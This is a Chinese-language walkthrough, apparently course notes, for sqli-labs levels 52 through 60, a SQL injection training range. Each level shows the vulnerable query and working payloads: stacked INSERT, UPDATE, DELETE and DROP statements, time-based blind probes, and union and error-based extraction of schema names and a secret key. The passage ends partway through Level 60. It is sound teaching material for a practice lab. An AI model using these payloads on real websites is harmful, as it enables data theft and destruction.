| 回显 | 常**无详细 SQL 报错**（偏盲注） |
| 关键 API | `mysqli_multi_query()` |
| 典型 SQL 形态 | `SELECT * FROM users ORDER BY $sort` |
| 与 Less-50 差异 | 同为数字型 ORDER BY 堆叠；52 更强调弱报错，读数据靠盲注或只写不读 |
| 与 Less-48 差异 | 48 无堆叠；52 可 `;` 多语句 |

#### 源码逻辑（理解用）

```latex
$sql = "SELECT * FROM users ORDER BY $sort";
mysqli_multi_query($con, $sql);
```

无引号，可直接 `1; insert ...`。报错关闭时，`updatexml` 不一定有可见回显，堆叠写操作仍是最稳验证手段。

#### 解题步骤

**1）确认数字型 ORDER BY**

```latex
?sort=1
?sort=2
?sort=1 desc
```

排序变化即说明注入点有效。

![1791169670396-f0901066-987f-4852-8b95-e261b9fc96ea.png](./img/285943702/1791169670396-f0901066-987f-4852-8b95-e261b9fc96ea-577348.png)

![1791169682710-4f8ef497-1831-4f6e-a677-02e447a0d1a5.png](./img/285943702/1791169682710-4f8ef497-1831-4f6e-a677-02e447a0d1a5-021012.png)

![1791169699521-452eb908-a786-4b86-b13d-97798cee14f8.png](./img/285943702/1791169699521-452eb908-a786-4b86-b13d-97798cee14f8-814336.png)

**2）堆叠插入（优先）**

```latex
?sort=1; insert into users(id,username,password) values(52,'less52','less52')--+
```

```latex
?sort=1 desc
```

观察是否出现大 id 的 `less52`，或直接查库。

![1791169744313-0d9af79c-26b1-4f90-8365-7bd35e6084a9.png](./img/285943702/1791169744313-0d9af79c-26b1-4f90-8365-7bd35e6084a9-414575.png)

![1791169755918-e0e4111f-8117-42c9-905f-e015869e637f.png](./img/285943702/1791169755918-e0e4111f-8117-42c9-905f-e015869e637f-278676.png)

**3）建表演示**

```latex
?sort=1; create table less52_copy like users--+
?sort=1; insert into less52_copy select * from users--+
```

![1791169899968-fde49df8-7eb2-47fa-94ea-725940c7cd43.png](./img/285943702/1791169899968-fde49df8-7eb2-47fa-94ea-725940c7cd43-094458.png)

![1791169913011-1b91caec-221f-4c43-8f86-c00dd261eaf0.png](./img/285943702/1791169913011-1b91caec-221f-4c43-8f86-c00dd261eaf0-187137.png)

**4）时间盲注读库（可选）**

无报错时：

```latex
?sort=if(length(database())=8,sleep(3),1)
?sort=if(ascii(substr(database(),1,1))=115,sleep(3),0)
```

有堆叠时不必强依赖延时读数。

![1791170153933-411b52c6-cfbb-4a2c-82ba-9a1d1a1adb42.png](./img/285943702/1791170153933-411b52c6-cfbb-4a2c-82ba-9a1d1a1adb42-942435.png)

**5）其它堆叠（仅限靶场）**

```latex
?sort=1; update users set password='p52' where username='less52'--+
?sort=1; delete from users where username='less52'--+
?sort=1; drop table if exists less52_copy--+
```

练习后用首页 **Setup/resetDB** 恢复。

![1791170323442-e23e9ec4-299c-4bf0-b7a8-e955f55cc6fb.png](./img/285943702/1791170323442-e23e9ec4-299c-4bf0-b7a8-e955f55cc6fb-543140.png)

![1791170345093-b09aeb65-31fd-489f-9351-48c9af4eb022.png](./img/285943702/1791170345093-b09aeb65-31fd-489f-9351-48c9af4eb022-388240.png)

#### 要点小结

| 点 | 说明 |
| --- | --- |
| 形态 | `?sort=1; 第二条SQL--+` |
| 类型 | 数字型，无引号 |
| 读 | 弱报错 → 时间盲注或放弃读、专注写 |
| 写 | 堆叠 INSERT/UPDATE/DELETE/CREATE |
| 对照 | 50 数字堆叠（常有报错可用）；52 数字堆叠 + 偏盲 |

***

### Less-53：GET · ORDER BY 注入 · 字符型 · 盲注倾向 + 堆叠

#### 关卡信息

| 项目 | 说明 |
| --- | --- |
| 路径 | `/Less-53/?sort=1` |
| 注入方式 | GET |
| 注入参数 | `sort` |
| 类型 | **字符型 ORDER BY** + **堆叠注入** |
| 闭合 | 单引号 `'` |
| 回显 | 常**无详细 SQL 报错**（偏盲注） |
| 关键 API | `mysqli_multi_query()` |
| 典型 SQL 形态 | `SELECT * FROM users ORDER BY '$sort'` |
| 与前后关关系 | 相对 51：同为字符型 ORDER BY 堆叠，本关弱报错；相对 49：同为字符型 ORDER BY 盲注，本关可 `;` 多语句；相对 52：52 无引号，53 需 `'` 闭合 |

#### 源码逻辑（理解用）

```latex
$sql = "SELECT * FROM users ORDER BY '$sort'";
mysqli_multi_query($con, $sql);
```

需先闭合引号再堆叠：

```sql
ORDER BY '1'; insert into users ... -- '
```

页面通常只处理第一条 SELECT 的结果集；后面语句是否执行，以数据是否被写入/修改为准。

#### 解题步骤

**1）确认字符型**

```latex
?sort=1
?sort=1'
?sort=1'--+
```

`1'` 异常、`1'--+` 恢复 → 单引号闭合。

![1791170639075-04c240b7-5101-4030-9598-9c6cf203d311.png](./img/285943702/1791170639075-04c240b7-5101-4030-9598-9c6cf203d311-385122.png)

![1791170649669-54d67e1e-ae1e-4e5e-b552-5c3842952440.png](./img/285943702/1791170649669-54d67e1e-ae1e-4e5e-b552-5c3842952440-630678.png)

**2）确认弱报错**

```latex
?sort=1' and updatexml(1,concat(0x7e,database()),1)--+
```

若无 XPATH 类回显，读数据改用时间盲注，或本关只练堆叠写操作。

![1791170792285-3955de24-5869-434f-9103-45954a56aa88.png](./img/285943702/1791170792285-3955de24-5869-434f-9103-45954a56aa88-693693.png)

**3）堆叠插入（推荐）**

```latex
?sort=1'; insert into users(id,username,password) values(53,'less53','less53')--+
```

验证：

```latex
?sort=1 desc
```

观察是否出现 `less53`，或直接查库。

![1791170858774-4ea5b798-7f2a-42af-af0d-72bcffb655a2.png](./img/285943702/1791170858774-4ea5b798-7f2a-42af-af0d-72bcffb655a2-627448.png)

![1791170920693-149130c7-69ff-43dc-b287-28fbe42b97b8.png](./img/285943702/1791170920693-149130c7-69ff-43dc-b287-28fbe42b97b8-492546.png)

![1791170876369-f495832b-b556-4efb-8b91-1df17b1987a4.png](./img/285943702/1791170876369-f495832b-b556-4efb-8b91-1df17b1987a4-610692.png)

**4）建表 / 拷贝**

```latex
?sort=1'; create table less53_copy like users--+
?sort=1'; insert into less53_copy select * from users--+
```

![1791170990861-d93c2efa-e694-4c71-bba1-fd394b638d4d.png](./img/285943702/1791170990861-d93c2efa-e694-4c71-bba1-fd394b638d4d-616646.png)

![1791171006005-6fdb9e10-c28d-4676-828e-13489be3bfe4.png](./img/285943702/1791171006005-6fdb9e10-c28d-4676-828e-13489be3bfe4-625958.png)

**5）时间盲注读库（可选）**

```latex
?sort=1' and if(length(database())=8,sleep(2),0)--+
?sort=1' and if(ascii(substr(database(),1,1))=115,sleep(2),0)--+
```

注意：ORDER BY 场景下 `sleep` 可能随行数叠加，秒数宜小，避免超时。

![1791171261937-b5ec48a7-ae87-4faa-a7f9-874243175f97.png](./img/285943702/1791171261937-b5ec48a7-ae87-4faa-a7f9-874243175f97-325852.png)

![1791171419663-8d430fba-59c0-4d93-a33d-ad5d4daf83c3.png](./img/285943702/1791171419663-8d430fba-59c0-4d93-a33d-ad5d4daf83c3-006159.png)

**6）其它堆叠（仅限靶场）**

```latex
?sort=1'; update users set password='p53' where username='less53'--+
?sort=1'; delete from users where username='less53'--+
?sort=1'; drop table if exists less53_copy--+
```

练习后可用首页 **Setup/resetDB** 恢复数据。

![1791171462291-249d3428-185e-47e7-ac2b-4cf7c692a3af.png](./img/285943702/1791171462291-249d3428-185e-47e7-ac2b-4cf7c692a3af-007887.png)

![1791171488828-22fd3484-be4f-407d-97cd-14b2c74b80f1.png](./img/285943702/1791171488828-22fd3484-be4f-407d-97cd-14b2c74b80f1-020070.png)

#### 要点小结

| 点 | 说明 |
| --- | --- |
| 形态 | `?sort=1'; 第二条SQL--+` |
| 闭合 | 必须 `'`，再 `;` |
| 读 | 弱报错 → 时间盲注（控制 sleep） |
| 写 | 堆叠 INSERT/UPDATE/DELETE/CREATE |
| 对照 | 51 字符堆叠（常有报错）；49 字符盲注无堆叠；52 数字盲注+堆叠 |

***

### Challenges  挑战

### Less-54：GET · Challenges · 单引号字符型 · 限次联合查询

#### 关卡信息

| 项目 | 说明 |
| --- | --- |
| 路径 | `/Less-54/?id=1` |
| 注入方式 | GET |
| 类型 | **字符型（单引号）** 联合查询 |
| 尝试次数 | 约 **10 次**（页面会显示 attempts） |
| 目标库 | `challenges`（不是固定的 `security.users`） |
| 目标 | 在次数用尽前取出随机表中的 **secret key**，并在页面提交 |
| 重置机制 | 次数超限或点 Reset 后，**表名、列名、数据会随机刷新** |

#### 源码 / 机制（理解用）

查询仍类似：

```sql
SELECT * FROM security.users WHERE id='$id' LIMIT 0,1
```

但挑战数据在 `challenges` 库的随机表中。每次重置都会换表名、secret 列名等，因此**不能背固定表名**，必须现场从 `information_schema` 查。

#### 解题步骤（控制在 10 次内）

建议顺序固定，每步一次请求：

**1）确认闭合（可与列数合并，省次数）**

```latex
?id=1'
?id=1'--+
```

单引号字符型。

![1791346613534-fbdeb70d-fd2a-45ff-a0d7-3cc7dd5b8e41.png](./img/285943702/1791346613534-fbdeb70d-fd2a-45ff-a0d7-3cc7dd5b8e41-805580.png)

![1791346626091-165e7448-e626-455e-8ded-1a16961af366.png](./img/285943702/1791346626091-165e7448-e626-455e-8ded-1a16961af366-322342.png)

**2）列数与回显位**

```latex
?id=-1' union select 1,2,3--+
```

观察 2、3 哪一列回显（常见 2 或 3）。

![1791346657196-d7958efe-e4a8-46c1-9715-01dd607df669.png](./img/285943702/1791346657196-d7958efe-e4a8-46c1-9715-01dd607df669-457453.png)

**3）爆 **`challenges`** 下的表名**

```latex
?id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='challenges'--+
```

或 `table_schema=database()`（若当前库已是 challenges，以页面提示为准）。

记下返回的**随机表名**（如 `f4kp5pe0zk`）。

![1791347211869-9b64fc9a-cad6-45f3-a986-82ec21237e5e.png](./img/285943702/1791347211869-9b64fc9a-cad6-45f3-a986-82ec21237e5e-799272.png)

**4）爆列名**

把 `表名` 换成上一步结果：

```latex
?id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_schema='challenges' and table_name='随机表名'--+
```

常见列类似：`id`、`sessid`、`secret_xxxx`、`tryy` 等，**secret 列名带随机后缀**。

![1791347269044-160488d0-ed6c-4365-8536-26b0e75d983c.png](./img/285943702/1791347269044-160488d0-ed6c-4365-8536-26b0e75d983c-776137.png)

**5）取 secret key**

```latex
?id=-1' union select 1,secret_列名,3 from challenges.随机表名--+
```

或：

```latex
?id=-1' union select 1,group_concat(secret_列名),3 from 随机表名--+
```

![1791347490144-d60be543-c5c6-4e38-844b-d051bcad29fb.png](./img/285943702/1791347490144-d60be543-c5c6-4e38-844b-d051bcad29fb-392312.png)

![1791347460514-2f0b9d60-5074-4b81-bd6e-28b71d970fb9.png](./img/285943702/1791347460514-2f0b9d60-5074-4b81-bd6e-28b71d970fb9-010229.png)

**6）提交密钥**

把回显的密钥填进页面的 secret 输入框，提交。成功会有 Congratulations 类提示。

![1791347514728-a4153359-3880-41f8-80fa-03121126658e.png](./img/285943702/1791347514728-a4153359-3880-41f8-80fa-03121126658e-551002.png)

![1791347530570-48e0987d-4fe4-4b24-b343-01f6c3300c8e.png](./img/285943702/1791347530570-48e0987d-4fe4-4b24-b343-01f6c3300c8e-672474.png)

#### 省次数技巧

| 技巧 | 说明 |
| --- | --- |
| 合并查询 | 一次 `union` 里用 `concat` 同时带出表名+列名（注意长度） |
| 少做无用探测 | 闭合、列数尽量一次搞定 |
| 写对库名 | 目标是 `challenges`，不要死查 `security.users` 的密码 |
| 超限后 | Reset 后表名全变，需从头查，不要用旧表名 |

#### 要点小结

| 点 | 说明 |
| --- | --- |
| 闭合 | `'` |
| 手法 | 标准联合查询 |
| 关键 | 限次 + 随机表/列 |
| 目标 | `challenges` 随机表中的 secret 列 |

***

### Less-55：GET · Challenges · 括号闭合 · 限次联合查询

#### 关卡信息

| 项目 | 说明 |
| --- | --- |
| 路径 | `/Less-55/?id=1` |
| 注入方式 | GET |
| 类型 | **数字/括号型**（常见闭合 `)`） |
| 尝试次数 | 约 **14 次**（以页面提示为准） |
| 目标库 | `challenges`，随机表名/列名 |
| 目标 | 限次内取出 secret key 并提交 |
| 与 Less-54 差异 | 闭合从 `'` 变为 `)`（源码多为 `WHERE id=($id)`） |

#### 源码逻辑（理解用）

```sql
SELECT * FROM security.users WHERE id=($id) LIMIT 0,1
```

`$id` 在括号内，无外层单引号时，用 `)` 闭合括号再 `union`；若环境带引号，以本地报错为准（多数 writeup 为 `)`）。

#### 解题步骤

**1）确认闭合**

```latex
?id=1'
?id=1)
?id=1)--+
```

`1)--+` 正常、单引号无效 → 按 `)` 构造。

![1791347919874-5352c767-e38e-4478-8358-095fecbf9c5d.png](./img/285943702/1791347919874-5352c767-e38e-4478-8358-095fecbf9c5d-315879.png)

![1791347998005-853b737a-4031-4bbc-aa03-b3f8037577f2.png](./img/285943702/1791347998005-853b737a-4031-4bbc-aa03-b3f8037577f2-042650.png)

![1791348009091-820f6c41-67dd-4124-9bfd-9e942c60ef0c.png](./img/285943702/1791348009091-820f6c41-67dd-4124-9bfd-9e942c60ef0c-348231.png)

**2）回显位**

```latex
?id=-1) union select 1,2,3--+
```

![1791348032398-77cacf78-6f97-4cee-a693-56de16115ba1.png](./img/285943702/1791348032398-77cacf78-6f97-4cee-a693-56de16115ba1-748914.png)

**3）爆表名**

```latex
?id=-1) union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='challenges'--+
```

![1791348118163-52c289bc-85a1-441f-bc3a-32c6728d82aa.png](./img/285943702/1791348118163-52c289bc-85a1-441f-bc3a-32c6728d82aa-797695.png)

**4）爆列名**

```latex
?id=-1) union select 1,group_concat(column_name),3 from information_schema.columns where table_schema='challenges' and table_name='随机表名'--+
```

![1791348169771-3ffeacf6-df04-4a71-bf00-7660a92e0ff1.png](./img/285943702/1791348169771-3ffeacf6-df04-4a71-bf00-7660a92e0ff1-085478.png)

**5）取 secret**

```latex
?id=-1) union select 1,secret_列名,3 from challenges.随机表名--+
```

![1791348226431-0ec05bd8-c822-49a6-a82b-6ada319728ec.png](./img/285943702/1791348226431-0ec05bd8-c822-49a6-a82b-6ada319728ec-238539.png)

**6）提交密钥**

填入页面验证框，完成挑战。

![1791351105733-6e95b6d5-b7be-40c5-8001-5ea181775158.png](./img/285943702/1791351105733-6e95b6d5-b7be-40c5-8001-5ea181775158-536045.png)

![1791351113745-334e01c8-a02d-4425-8a42-d952d5a42db6.png](./img/285943702/1791351113745-334e01c8-a02d-4425-8a42-d952d5a42db6-951887.png)

#### 省次数与注意

| 点 | 说明 |
| --- | --- |
| 次数 | 比 54 略宽（约 14 次），仍应一次一步 |
| 闭合 | payload 统一用 `)`，不要写成 `'` |
| 随机性 | 每次 Reset 后表名、secret 列名都要重查 |
| 库名 | 固定盯 `challenges` |

#### 要点小结

| 点 | 说明 |
| --- | --- |
| 闭合 | `)` |
| 手法 | 联合查询，流程同 54 |
| 目标 | 随机表中的 secret key |
| 对照 | 54：`'` + 约 10 次；55：`)` + 约 14 次 |

***

### Less-56：GET · Challenges · 闭合 `')` · 限次联合查询

#### 关卡信息

| 项目 | 说明 |
| --- | --- |
| 路径 | `/Less-56/?id=1` |
| 注入方式 | GET |
| 类型 | 字符型 |
| 闭合方式 | `')`（单引号 + 右括号） |
| 尝试次数 | 约 **14 次**（以页面为准） |
| 目标库 | `challenges`，表名/列名随机 |
| 目标 | 限次内取出 secret key 并提交 |
| 与前后关 | 54：`'`；55：`)`；56：`')` |

#### 源码逻辑（理解用）

类似：

```sql
SELECT * FROM security.users WHERE id=('$id') LIMIT 0,1
```

需用 `')` 结束字符串和括号，再 `union`。挑战数据在 `challenges` 随机表中。

#### 解题步骤

**1）确认闭合**

```latex
?id=1'
?id=1')
?id=1')--+
```

`1')--+` 正常 → 闭合为 `')`。

![1791351943487-a0d7c0e1-9a47-487f-9643-17f748100322.png](./img/285943702/1791351943487-a0d7c0e1-9a47-487f-9643-17f748100322-575186.png)

![1791351955969-adaa9e01-d501-45c9-abf7-5d3bb399088c.png](./img/285943702/1791351955969-adaa9e01-d501-45c9-abf7-5d3bb399088c-603295.png)

![1791352279938-cd9133a6-d929-44db-a0a4-5397ca9b9a90.png](./img/285943702/1791352279938-cd9133a6-d929-44db-a0a4-5397ca9b9a90-904397.png)

**2）回显位**

```latex
?id=-1') union select 1,2,3--+
```

![1791352390733-54114296-96d6-4995-8062-a94603fd79c7.png](./img/285943702/1791352390733-54114296-96d6-4995-8062-a94603fd79c7-052841.png)

**3）爆表名**

```latex
?id=-1') union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='challenges'--+
```

或 `table_schema=database()`（以当前库提示为准）。

![1791352497525-fbde2d51-b126-4573-986d-c52a2ee4dd84.png](./img/285943702/1791352497525-fbde2d51-b126-4573-986d-c52a2ee4dd84-252300.png)

**4）爆列名**

```latex
?id=-1') union select 1,group_concat(column_name),3 from information_schema.columns where table_schema='challenges' and table_name='随机表名'--+
```

关注带 `secret_` 前缀的列。

![1791352574330-d9494d5e-d1f0-4aeb-9755-7b806be52ad6.png](./img/285943702/1791352574330-d9494d5e-d1f0-4aeb-9755-7b806be52ad6-059991.png)

**5）取 secret key**

```latex
?id=-1') union select 1,secret_列名,3 from challenges.随机表名--+
```

![1791352635413-e73689eb-8ada-4f87-9400-a3de688118a5.png](./img/285943702/1791352635413-e73689eb-8ada-4f87-9400-a3de688118a5-619676.png)

**6）提交密钥**

填入页面验证框，完成挑战。

![1791352650961-4c5eb2e4-b7f2-4e12-81ac-7462659b9d89.png](./img/285943702/1791352650961-4c5eb2e4-b7f2-4e12-81ac-7462659b9d89-798731.png)

![1791352671287-6eb0a63c-3509-420d-896f-480cdfba5f63.png](./img/285943702/1791352671287-6eb0a63c-3509-420d-896f-480cdfba5f63-982797.png)

#### 要点小结

| 点 | 说明 |
| --- | --- |
| 闭合 | `')` |
| 手法 | 联合查询，流程同 54/55 |
| 目标 | `challenges` 随机表的 secret |
| 次数 | 控制在限额内，少做无效探测 |

***

### Less-57：GET · Challenges · 双引号 `"` · 限次联合查询

#### 关卡信息

| 项目 | 说明 |
| --- | --- |
| 路径 | `/Less-57/?id=1` |
| 注入方式 | GET |
| 类型 | 字符型 |
| 闭合方式 | `"`（双引号） |
| 尝试次数 | 约 **14 次**（以页面为准） |
| 目标库 | `challenges`，表名/列名随机 |
| 目标 | 限次内取出 secret key 并提交 |
| 与前后关 | 仅闭合改为双引号，流程不变 |

#### 源码逻辑（理解用）

类似：

```sql
SELECT * FROM security.users WHERE id="$id" LIMIT 0,1
```

用 `"` 闭合后联合查询；目标仍在 `challenges` 随机表。

#### 解题步骤

**1）确认闭合**

```latex
?id=1'
?id=1"
?id=1"--+
```

`1"--+` 正常 → 双引号字符型。

![1791353356327-0d9918aa-0da8-44b3-829b-fbdb72605f1f.png](./img/285943702/1791353356327-0d9918aa-0da8-44b3-829b-fbdb72605f1f-336575.png)

![1791353368317-64e09d9c-8db0-4d68-aa8c-3f281794fa81.png](./img/285943702/1791353368317-64e09d9c-8db0-4d68-aa8c-3f281794fa81-547352.png)

![1791353384551-fdc54854-0296-4139-87d3-13c6612c2be4.png](./img/285943702/1791353384551-fdc54854-0296-4139-87d3-13c6612c2be4-378777.png)

**2）回显位**

```latex
?id=-1" union select 1,2,3--+
```

![1791353416579-912092ec-6f54-4358-9de2-68a4c6df71ff.png](./img/285943702/1791353416579-912092ec-6f54-4358-9de2-68a4c6df71ff-689358.png)

**3）爆表名**

```latex
?id=-1" union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='challenges'--+
```

![1791353573923-30b702af-2848-479f-8ca8-2bd63ee10fdb.png](./img/285943702/1791353573923-30b702af-2848-479f-8ca8-2bd63ee10fdb-306533.png)

**4）爆列名**

```latex
?id=-1" union select 1,group_concat(column_name),3 from information_schema.columns where table_schema='challenges' and table_name='随机表名'--+
```

![1791357297238-f056da3e-fb9a-4221-b95f-610cea81cfc8.png](./img/285943702/1791357297238-f056da3e-fb9a-4221-b95f-610cea81cfc8-255409.png)

**5）取 secret key**

```latex
?id=-1" union select 1,secret_列名,3 from challenges.随机表名--+
```

![1791357386861-6feeb59c-e6a2-4ac8-afca-ef6c9b7d1734.png](./img/285943702/1791357386861-6feeb59c-e6a2-4ac8-afca-ef6c9b7d1734-243767.png)

**6）提交密钥**

填入页面完成挑战。

![1791357406766-a6f5ee6d-ca0d-4c19-bea8-58ccb2724bd7.png](./img/285943702/1791357406766-a6f5ee6d-ca0d-4c19-bea8-58ccb2724bd7-595989.png)

![1791357420383-2ad62c9e-0cc8-4cba-a250-2443564d675c.png](./img/285943702/1791357420383-2ad62c9e-0cc8-4cba-a250-2443564d675c-054694.png)

#### 要点小结

| 点 | 说明 |
| --- | --- |
| 闭合 | `"` |
| 手法 | 联合查询 |
| 目标 | 随机表中的 secret 列 |
| 注意 | Reset 后表名、列名全部重查 |

***

### Less-58：GET · Challenges · 单引号 · 报错注入（限次）

#### 关卡信息

| 项目 | 说明 |
| --- | --- |
| 路径 | `/Less-58/?id=1` |
| 注入方式 | GET |
| 类型 | 字符型（单引号） |
| 主手法 | **报错注入**（`updatexml` / `extractvalue`） |
| 尝试次数 | 更紧（常见约 **5～10 次**，以页面为准） |
| 目标库 | `challenges`，表名/列名随机 |
| 目标 | 限次内取出 secret key 并提交 |
| 与 54～57 差异 | 联合查询往往**无业务数据回显**，改用报错把结果打进错误信息 |

#### 源码逻辑（理解用）

仍为类似 `WHERE id='$id'` 的拼接，但页面不把 `UNION` 的列内容正常展示出来（或查询结构导致联合不好用）。存在 **MySQL 报错回显**，适合 XPATH 类报错函数。挑战数据仍在 `challenges` 随机表。

#### 解题步骤

**1）确认闭合与报错可用**

```latex
?id=1'
?id=1'--+
```

![1791357809427-3bb9a6f3-734f-4ff6-b4b5-f9780e90231c.png](./img/285943702/1791357809427-3bb9a6f3-734f-4ff6-b4b5-f9780e90231c-046129.png)

![1791357825418-3ec27104-ff1c-4d35-a6e1-faeb2e35e49e.png](./img/285943702/1791357825418-3ec27104-ff1c-4d35-a6e1-faeb2e35e49e-250531.png)

单引号字符型。再试：

```latex
?id=1' and updatexml(1,concat(0x7e,database(),0x7e),1)--+
```

错误信息中出现 `~challenges~` 或库名 → 报错注入成立。

![1791357865118-add9cffe-1185-40c7-b8d5-70a8425a71b1.png](./img/285943702/1791357865118-add9cffe-1185-40c7-b8d5-70a8425a71b1-051797.png)

**2）爆表名（控制次数，一次一步）**

```latex
?id=1' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='challenges'),0x7e),1)--+
```

过长时可：

```latex
?id=1' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='challenges' limit 0,1),0x7e),1)--+
```

![1791357987901-62120e0a-77c6-4e8a-b48c-0cb5bf9ce90d.png](./img/285943702/1791357987901-62120e0a-77c6-4e8a-b48c-0cb5bf9ce90d-778908.png)

**3）爆列名**

```latex
?id=1' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema='challenges' and table_name='随机表名'),0x7e),1)--+
```

记下 `secret_xxxx` 列名。

![1791358089949-5012ff72-d76e-4301-9385-5ee7680f70da.png](./img/285943702/1791358089949-5012ff72-d76e-4301-9385-5ee7680f70da-394595.png)

**4）取 secret key**

```latex
?id=1' and updatexml(1,concat(0x7e,(select secret_列名 from 随机表名 limit 0,1),0x7e),1)--+
```

或：

```latex
?id=1' and extractvalue(1,concat(0x7e,(select secret_列名 from 随机表名 limit 0,1)))--+
```

![1791358271381-75f514d1-c789-4714-884e-55c37fc6847e.png](./img/285943702/1791358271381-75f514d1-c789-4714-884e-55c37fc6847e-888995.png)

**5）提交密钥**

把错误信息中 `~...~` 内的密钥填入页面验证。

![1791358289318-0d7afeaa-0de5-4b18-bf2c-2b0de1af9822.png](./img/285943702/1791358289318-0d7afeaa-0de5-4b18-bf2c-2b0de1af9822-582607.png)

![1791358299807-3de43113-155d-45ce-aa49-29801305f815.png](./img/285943702/1791358299807-3de43113-155d-45ce-aa49-29801305f815-565154.png)

#### 省次数技巧

| 技巧 | 说明 |
| --- | --- |
| 少用 UNION 试探 | 本关以报错为主，避免浪费次数 |
| `limit` 分段 | `group_concat` 被截断时按行取 |
| 写对库名 | `challenges` / `database()` |
| 超限 | Reset 后表名、列名全变，需重查 |

#### 要点小结

| 点 | 说明 |
| --- | --- |
| 闭合 | `'` |
| 手法 | 报错注入，不是联合回显 |
| 目标 | 随机表中的 secret 列 |
| 次数 | 比 54～57 更紧，步骤要精简 |

***

### Less-59：GET · Challenges · 数字型 · 报错注入（限次）

#### 关卡信息

| 项目 | 说明 |
| --- | --- |
| 路径 | `/Less-59/?id=1` |
| 注入方式 | GET |
| 类型 | **数字型**（无引号包裹 `$id`） |
| 主手法 | **报错注入** |
| 尝试次数 | 约 **5～10 次**（以页面为准） |
| 目标库 | `challenges`，表名/列名随机 |
| 目标 | 限次内取出 secret key 并提交 |
| 与 Less-58 差异 | 无需 `'` 闭合，payload 直接接在数字后 |

#### 源码逻辑（理解用）

```sql
SELECT * FROM security.users WHERE id=$id LIMIT 0,1
```

整型注入 + 报错回显；挑战数据仍在 `challenges` 随机表。

#### 解题步骤

**1）确认数字型**

```latex
?id=1'
?id=1 and 1=1
?id=1 and 1=2
```

不必依赖引号；`and 1=2` 可导致无数据。

![1791358602373-ba0b68b4-65c1-4f31-a12d-ca2612649375.png](./img/285943702/1791358602373-ba0b68b4-65c1-4f31-a12d-ca2612649375-182725.png)

![1791358612211-24c73f38-8ac7-4287-b3ea-76b8952c5c11.png](./img/285943702/1791358612211-24c73f38-8ac7-4287-b3ea-76b8952c5c11-130160.png)

![1791358631138-41d99884-47c6-40d1-b899-7f6da14c58a0.png](./img/285943702/1791358631138-41d99884-47c6-40d1-b899-7f6da14c58a0-179544.png)

**2）报错确认**

```latex
?id=1 and updatexml(1,concat(0x7e,database(),0x7e),1)--+
```

错误中出现库名即可。

![1791358681507-f32e62c5-9d1a-4d29-a84f-452ff6973602.png](./img/285943702/1791358681507-f32e62c5-9d1a-4d29-a84f-452ff6973602-835290.png)

**3）爆表名**

```latex
?id=1 and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='challenges'),0x7e),1)--+
```

![1791358732075-a06d2f4b-2066-46a0-a80b-3f7f0f2b58b4.png](./img/285943702/1791358732075-a06d2f4b-2066-46a0-a80b-3f7f0f2b58b4-498381.png)

**4）爆列名**

```latex
?id=1 and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema='challenges' and table_name='随机表名'),0x7e),1)--+
```

![1791358771142-b0232bca-9835-423d-854a-52ed80b09a82.png](./img/285943702/1791358771142-b0232bca-9835-423d-854a-52ed80b09a82-316853.png)

**5）取 secret key**

```latex
?id=1 and updatexml(1,concat(0x7e,(select secret_列名 from 随机表名 limit 0,1),0x7e),1)--+
```

![1791359009855-e3b5de45-86f5-4003-b4b8-96d6cd8b2736.png](./img/285943702/1791359009855-e3b5de45-86f5-4003-b4b8-96d6cd8b2736-382224.png)

**6）提交密钥**

填入页面完成挑战。

![1791359014905-b179f9d6-bff9-4939-b011-1e72fd1841df.png](./img/285943702/1791359014905-b179f9d6-bff9-4939-b011-1e72fd1841df-317522.png)

![1791359019039-1326ef18-97b9-4f40-a9e0-ea524e1289ac.png](./img/285943702/1791359019039-1326ef18-97b9-4f40-a9e0-ea524e1289ac-181797.png)

#### 要点小结

| 点 | 说明 |
| --- | --- |
| 类型 | 数字型，无引号 |
| 手法 | `and updatexml(...)` / `extractvalue` |
| 目标 | `challenges` 随机表 secret |
| 对照 | 58 为 `' ` + 报错；59 为整型 + 报错 |

***

### Less-60：GET · Challenges · 闭合 `")` · 报错注入（限次）

#### 关卡信息

| 项目 | 说明 |
| --- | --- |
| 路径 | `/Less-60/?id=1` |
| 注入方式 | GET |
| 类型 | 字符型 |
| 闭合方式 | `")`（双引号 + 右括号） |
| 主手法 | **报错注入**（`updatexml` / `extractvalue`） |
| 尝试次数 | 约 **5～10 次**（以页面为准） |
| 目标库 | `challenges`，表名/列名随机 |
| 目标 | 限次内取出 secret key 并提交 |
| 与前后关 | 58：`'` 报错；59：数字报错；60：`")` 报错 |

#### 源码逻辑（理解用）

类似：

```sql
SELECT * FROM security.users WHERE id=("$id") LIMIT 0,1
```

联合往往无业务回显，依赖报错把结果打到页面；挑战数据在 `challenges` 随机表。

#### 解题步骤

**1）确认闭合**

```latex
?id=1'
?id=1"
?id=1")
?id=1")--+
```

`1")--+` 正常 → 闭合为 `")`。

![1791359467903-bf72bec4-c423-4e03-830e-3b9777c54a9e.png](./img/285943702/1791359467903-bf72bec4-c423-4e03-830e-3b9777c54a9e-903598.png)

![1791359481480-31ea497e-dced-4e5b-b05c-7fdf4d62fbf8.png](./img/285943702/1791359481480-31ea497e-dced-4e5b-b05c-7fdf4d62fbf8-292524.png)

![1791359510498-0db06fc5-0689-4a3a-b05d-a3cf4a811fb3.png](./img/285943702/1791359510498-0db06fc5-0689-4a3a-b05d-a3cf4a811fb3-880997.png)

![1791359526319-4b4823f7-2ae4-4477-b5b0-feaf4990e9ce.png](./img/285943702/1791359526319-4b4823f7-2ae4-4477-b5b0-feaf4990e9ce-881759.png)

**2）报错确认**

```latex
?id=1") and updatexml(1,concat(0x7e,database(),0x7e),1)--+
```

错误信息中出现库名（多为 `challenges`）即可。

![1791359596885-ccfc97f1-d7bf-4286-b2d9-0fb3f1e16093.png](./img/285943702/1791359596885-ccfc97f1-d7bf-4286-b2d9-0fb3f1e16093-121014.png)

**3）爆表名**

```latex
?id=1") and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='challenges'),0x7e),1)--+
```

过长时用 `limit 0,1` 逐表取。

